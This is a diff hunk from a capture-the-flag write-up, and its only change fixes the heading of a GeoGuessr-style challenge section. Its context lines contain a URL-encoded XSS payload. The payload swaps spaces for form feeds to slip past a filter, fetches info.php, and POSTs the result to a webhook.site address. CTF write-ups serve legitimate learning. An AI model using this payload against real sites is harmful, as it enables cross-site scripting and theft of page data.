@@ -66,7 +66,7 @@ Replacing space `%20` with `%0C` to bypass filter, and the encoded payload for a
 http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc%3Da%0Conerror%3D%22fetch%28%27%5C%5Cinfo%2Ephp%5C%5Ca%2Ephp%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28r%3D%3Efetch%28%27https%3A%5C%5C%5C%5Cwebhook%2Esite%5C%5C%5BREDACTED%5D%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Ar%7D%29%29%22%3E%0A
 ```
 
-## misc/NM~~PZ~~~ (GeoGuessr-style)
+## misc/NM~~PZ~~ (GeoGuessr-style)
 
 This is some notes on my process of solving some of the challenges with the team (also with a lot of luck involved). It may contain some errors due to limited knowledge on different locations, and just write about observations and knowledge gathered during solving the challenge.
 
